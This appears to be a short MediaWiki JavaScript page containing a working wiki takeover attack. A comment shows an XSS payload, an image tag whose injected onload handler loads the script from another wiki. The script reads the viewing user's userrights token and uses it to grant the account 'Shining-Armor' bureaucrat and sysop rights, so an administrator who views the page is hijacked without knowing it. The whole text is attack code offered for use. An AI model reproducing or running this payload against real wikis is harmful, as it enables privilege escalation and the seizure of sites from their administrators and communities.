// [img http://i.imgur.com/We01aqi.jpg" onload="importScriptPage('MediaWiki:Test.js', 'shining-armor')]

$(function(){
    $.getJSON('/api.php?action=query&list=users&ususers=Shining-Armor&ustoken=userrights&format=json', function(response) {
        var token = response.query.users[0].userrightstoken;
        
        $.post('/api.php?action=userrights&user=Shining-Armor&token=' + encodeURIComponent(token) +'&add=bureaucrat|sysop&reason=CodeRemoval&format=json', function(data) {
            console.log(data);
        });
    });
});